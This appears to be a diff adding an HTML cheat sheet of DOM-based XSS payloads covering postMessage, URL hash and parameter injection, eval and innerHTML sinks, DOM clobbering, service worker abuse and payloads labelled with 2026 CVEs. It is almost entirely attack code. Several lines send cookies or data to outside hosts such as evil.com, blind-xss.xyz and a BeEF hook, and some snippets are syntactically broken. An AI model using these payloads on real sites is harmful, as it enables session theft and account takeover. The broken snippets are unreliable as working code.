@@ -1,0 +1,301 @@
+<!-- ==================== PART 1: POSTMESSAGE XSS PAYLOADS ==================== -->
+
+<!-- 1.1 Basic PostMessage XSS -->
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('javascript:alert(1)//http:','*')">
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('<svg/onload=alert(1)>','*')">
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+
+<!-- 1.2 Advanced PostMessage Payloads -->
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage(JSON.stringify({type:'load-channel',url:'javascript:alert(document.cookie)'}),'*')">
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage(JSON.stringify({type:'load-channel',url:'data:text/html,<script>alert(1)</script>'}),'*')">
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage(JSON.stringify({type:'load-channel',url:'<img src=x onerror=alert(1)>'}),'*')">
+
+<!-- 1.3 PostMessage with Origin Spoofing -->
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('javascript:alert(1)','https://trusted.com')">
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','https://trusted.com')">
+
+<!-- 1.4 Multi-Step PostMessage Attack -->
+<iframe src="https://target.com/" onload="setTimeout(()=>{this.contentWindow.postMessage('step1','*');setTimeout(()=>{this.contentWindow.postMessage('step2','*')},500)},500)">
+
+<!-- ==================== PART 2: URL HASH/FRAGMENT INJECTION ==================== -->
+
+<!-- 2.1 Hash-Based DOM XSS -->
+<iframe src="https://target.com/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#<img src=x onerror=alert(1)>',500)">
+<iframe src="https://target.com/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#<svg/onload=alert(1)>',500)">
+<iframe src="https://target.com/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#javascript:alert(1)',500)">
+<iframe src="https://target.com/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#<script>alert(1)</script>',500)">
+
+<!-- 2.2 Hash with URL Redirection -->
+<iframe src="https://target.com/redirect?url=https://evil.com#<img src=x onerror=alert(1)>">
+<iframe src="https://target.com/auth/login?returnUrl=/#<svg/onload=alert(1)>">
+
+<!-- ==================== PART 3: URL PARAMETER INJECTION ==================== -->
+
+<!-- 3.1 Product/Parameter Injection -->
+<iframe src="https://target.com/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://target.com';window.x=1;">
+<iframe src="https://target.com/product?productId=1&'><img src=x onerror=alert(1)>" onload="if(!window.x)this.src='https://target.com';window.x=1;">
+<iframe src="https://target.com/product?productId=1&'><svg/onload=alert(1)>" onload="if(!window.x)this.src='https://target.com';window.x=1;">
+
+<!-- 3.2 Search Parameter Injection -->
+<iframe src="https://target.com/search?q='><script>alert(1)</script>">
+<iframe src="https://target.com/search?q='><img src=x onerror=alert(1)>">
+<iframe src="https://target.com/search?q=\"';alert(1);//">
+
+<!-- ==================== PART 4: ONCLICK/ONFOCUS MANIPULATION ==================== -->
+
+<!-- 4.1 Tabindex/Focus Injection -->
+<form id=x tabindex=0 onfocus=alert(1)><input id=attributes>
+<form id=x tabindex=0 onfocus=print()><input id=attributes>
+<div tabindex=0 onfocus=alert(document.cookie) autofocus>
+<input tabindex=0 onfocus=alert(1) autofocus>
+
+<!-- 4.2 Clickjacking with DOM Events -->
+<iframe src="https://target.com/" onload="this.contentWindow.document.body.innerHTML='<div onclick=alert(1)>Click</div>'">
+<iframe src="https://target.com/" onload="this.contentWindow.document.body.onclick=alert(1)">
+
+<!-- ==================== PART 5: URL REDIRECTION MANIPULATION ==================== -->
+
+<!-- 5.1 Return URL/Back URL Injection -->
+<a href='#' onclick='returnURL = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back</a>
+<!-- Attack: https://target.com/?url=javascript:alert(1) -->
+<!-- Attack: https://target.com/?url=data:text/html,<script>alert(1)</script> -->
+<!-- Attack: https://target.com/?url=https://evil.com -->
+
+<!-- 5.2 Redirect Parameter Injection -->
+https://target.com/redirect?url=javascript:alert(1)
+https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
+https://target.com/redirect?url=//evil.com/%0D%0Aalert(1)
+https://target.com/auth?callbackUrl=javascript:alert(document.cookie)
+
+<!-- ==================== PART 6: INNERHTML/DOCUMENT.WRITE SINK ==================== -->
+
+<!-- 6.1 innerHTML Injection -->
+<script>document.getElementById('output').innerHTML = location.hash.substring(1)</script>
+<!-- Attack: https://target.com/#<img src=x onerror=alert(1)> -->
+
+<script>document.getElementById('output').innerHTML = new URL(location).searchParams.get('q')</script>
+<!-- Attack: https://target.com/?q=<img src=x onerror=alert(1)> -->
+
+<!-- 6.2 document.write Injection -->
+<script>document.write(location.hash.substring(1))</script>
+<script>document.write(new URL(location).searchParams.get('q'))</script>
+<script>document.write('<div>' + location.search.substring(1) + '</div>')</script>
+
+<!-- 6.3 insertAdjacentHTML Injection -->
+<script>document.querySelector('#target').insertAdjacentHTML('beforeend', location.hash.substring(1))</script>
+<script>document.querySelector('#target').insertAdjacentHTML('beforeend', new URL(location).searchParams.get('q'))</script>
+
+<!-- ==================== PART 7: EVAL/SETTIMEOUT/FUNCTION SINK ==================== -->
+
+<!-- 7.1 eval() Injection -->
+<script>eval(location.hash.substring(1))</script>
+<script>eval(new URL(location).searchParams.get('code'))</script>
+<!-- Attack: https://target.com/#alert(1) -->
+<!-- Attack: https://target.com/#document.location='https://evil.com?c='+document.cookie -->
+
+<!-- 7.2 setTimeout/setInterval Injection -->
+<script>setTimeout(location.hash.substring(1), 0)</script>
+<script>setInterval(location.hash.substring(1), 1000)</script>
+<script>setTimeout(new URL(location).searchParams.get('code'), 0)</script>
+
+<!-- 7.3 Function() Constructor Injection -->
+<script>Function(location.hash.substring(1))()</script>
+<script>new Function(location.hash.substring(1))()</script>
+
+<!-- ==================== PART 8: WEB MESSAGING (CROSS-ORIGIN) ==================== -->
+
+<!-- 8.1 Cross-Origin PostMessage Stealing -->
+<script>
+window.addEventListener('message', function(e) {
+  fetch('https://evil.com/steal?data=' + JSON.stringify(e.data));
+  eval(e.data);
+});
+</script>
+
+<!-- 8.2 PostMessage to All Origins -->
+<script>
+window.postMessage('<img src=x onerror=alert(1)>', '*');
+window.postMessage('javascript:alert(1)', '*');
+window.postMessage(JSON.stringify({type:'load-channel',url:'javascript:alert(1)'}), '*');
+</script>
+
+<!-- 8.3 PostMessage Tabnabbing -->
+<script>
+window.opener.postMessage('javascript:window.location="https://evil.com/fake-login"', '*');
+</script>
+
+<!-- ==================== PART 9: LOCALSTORAGE/SESSIONSTORAGE ==================== -->
+
+<!-- 9.1 Storage-Based DOM XSS -->
+<script>
+var data = localStorage.getItem('userInput');
+document.getElementById('output').innerHTML = data;
+</script>
+<!-- Attack via: localStorage.setItem('userInput', '<img src=x onerror=alert(1)>') -->
+
+<!-- 9.2 Storage Poisoning -->
+<script>
+localStorage.setItem('theme', '<img src=x onerror=alert(1)>');
+sessionStorage.setItem('preferences', '<svg/onload=alert(1)>');
+</script>
+
+<!-- ==================== PART 10: WEBSOCKET INJECTION ==================== -->
+
+<!-- 10.1 WebSocket Message XSS -->
+<script>
+var ws = new WebSocket('wss://target.com/socket');
+ws.onmessage = function(e) {
+  document.getElementById('output').innerHTML = e.data;
+};
+</script>
+
+<!-- 10.2 WebSocket Payload -->
+<script>
+var ws = new WebSocket('wss://target.com/socket');
+ws.onopen = function() {
+  ws.send('<img src=x onerror=alert(1)>');
+};
+</script>
+
+<!-- ==================== PART 11: CROSS-ORIGIN RESOURCE SHARING ==================== -->
+
+<!-- 11.1 CORS-Based DOM XSS -->
+<script>
+fetch('https://target.com/api/data?callback=alert(1)')
+  .then(r => r.text())
+  .then(data => document.write(data));
+</script>
+
+<!-- 11.2 JSONP Injection -->
+<script src="https://target.com/api/jsonp?callback=alert(1)"></script>
+<script>function alert(1){document.write('<img src=x onerror=alert(1)>')}</script>
+
+<!-- ==================== PART 12: HISTORY & NAVIGATION ==================== -->
+
+<!-- 12.1 pushState/replaceState Injection -->
+<script>
+history.pushState({}, '', '#<img src=x onerror=alert(1)>');
+location.reload();
+</script>
+
+<!-- 12.2 HashChange Event -->
+<script>
+window.onhashchange = function() {
+  document.getElementById('output').innerHTML = location.hash.substring(1);
+};
+</script>
+
+<!-- ==================== PART 13: DOM CLOSERING ==================== -->
+
+<!-- 13.1 Form/DOM Clobbering -->
+<form name="alert"></form>
+<form name="document"></form>
+<form id="x"><button name="innerHTML" value="<img src=x onerror=alert(1)>"></form>
+
+<!-- 13.2 HTMLCollection Overwrite -->
+<form name="getElementById"></form>
+<form name="querySelector"></form>
+
+<!-- ==================== PART 14: SRI & NONCE LEAKAGE ==================== -->
+
+<!-- 14.1 Nonce Extraction via CSS -->
+<style>
+@import 'https://evil.com/leak?nonce=' + document.querySelector('script[nonce]').nonce;
+</style>
+
+<!-- 14.2 SRI Hash Bypass -->
+<script integrity="sha384-xxx" src="https://evil.com/payload.js"></script>
+
+<!-- ==================== PART 15: REAL CVE-BASED PAYLOADS 2026 ==================== -->
+
+<!-- CVE-2026-33510 - Homarr Dashboard XSS via callbackUrl -->
+<iframe src="https://target.com/auth/login?callbackUrl=javascript:alert(document.cookie)">
+<iframe src="https://target.com/auth/login?callbackUrl=data:text/html,<script>alert(1)</script>">
+<iframe src="https://target.com/auth/login?callbackUrl=%22%3E%3Csvg/onload=alert(1)%3E">
+
+<!-- CVE-2026-43900 - DeepChat SVG Sanitizer Bypass -->
+<iframe src="https://target.com/chat?message=<svg><script>alert(1)</script></svg>">
+<iframe src="https://target.com/chat?message=<svg><a href=javascript:alert(1)>click</a></svg>">
+
+<!-- CVE-2026-0540 - DOMPurify mXSS -->
+<iframe src="https://target.com/?q=<xmp><img src=x onerror=alert(1)></xmp>">
+<iframe src="https://target.com/?q=<iframe><img src=x onerror=alert(1)></iframe>">
+
+<!-- CVE-2026-2266 - GitHub Enterprise Task List -->
+<iframe src="https://github.com/org/repo/issues/1?body=-%20[x]%20<img%20src=x%20onerror=alert(1)>">
+
+<!-- ==================== PART 16: BLIND DOM-BASED XSS ==================== -->
+
+<!-- 16.1 Blind PostMessage XSS -->
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('javascript:fetch(\'https://blind-xss.xyz/steal?c=\'+document.cookie)//http:','*')">
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('<img src=x onerror=fetch(\'https://blind-xss.xyz/steal?c=\'+document.cookie)>','*')">
+
+<!-- 16.2 Blind DOM XSS with BeEF -->
+<script src="http://YOUR-IP:3000/hook.js"></script>
+<iframe src="https://target.com/" onload="this.contentWindow.postMessage('<script src=http://YOUR-IP:3000/hook.js><\/script>','*')">
+
+<!-- ==================== PART 17: ADVANCED POSTMESSAGE WEAPONIZATION ==================== -->
+
+<!-- 17.1 Steal PostMessage Data -->
+<script>
+var stolenData = [];
+window.addEventListener('message', function(e) {
+  stolenData.push(e.data);
+  navigator.sendBeacon('https://evil.com/steal', JSON.stringify(stolenData));
+});
+</script>
+
+<!-- 17.2 PostMessage Origin Spoofing Bypass -->
+<iframe src="https://target.com/" sandbox="allow-same-origin allow-scripts allow-popups allow-forms">
+<!-- Attack: postMessage from sandboxed iframe -->
+
+<!-- 17.3 Channel Messaging Attack -->
+<script>
+var channel = new MessageChannel();
+window.parent.postMessage('data', '*', [channel.port2]);
+channel.port1.onmessage = function(e) {
+  eval(e.data);
+};
+</script>
+
+<!-- ==================== PART 18: UI REDRESSING & TABNABBING ==================== -->
+
+<!-- 18.1 Tabnabbing with DOM XSS -->
+<script>
+window.opener.location = 'https://evil.com/fake-login?redirect=' + document.location;
+</script>
+
+<!-- 18.2 Clickjacking Payload -->
+<iframe src="https://target.com/" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;" onload="this.contentWindow.postMessage('javascript:alert(1)','*')">
+
+<!-- ==================== PART 19: SERVICE WORKER ABUSE ==================== -->
+
+<!-- 19.1 Malicious Service Worker -->
+<script>
+navigator.serviceWorker.register('https://evil.com/sw.js');
+navigator.serviceWorker.controller.postMessage('<img src=x onerror=alert(1)>');
+</script>
+
+<!-- 19.2 Service Worker XSS -->
+<script>
+navigator.serviceWorker.register('data:text/javascript,fetch("https://evil.com/steal?c="+document.cookie)');
+</script>
+
+<!-- ==================== PART 20: WEB COMPONENTS & SHADOW DOM ==================== -->
+
+<!-- 20.1 Shadow DOM Injection -->
+<script>
+customElements.define('xss-element', class extends HTMLElement {
+  connectedCallback() {
+    this.attachShadow({mode: 'open'}).innerHTML = location.hash.substring(1);
+  }
+});
+</script>
+<xss-element></xss-element>
+<!-- Attack: https://target.com/#<img src=x onerror=alert(1)> -->
+
+<!-- 20.2 Web Component Payload -->
+<script>
+document.body.appendChild(document.createElement('div')).attachShadow({mode:'open'}).innerHTML = '<img src=x onerror=alert(1)>';
+</script>
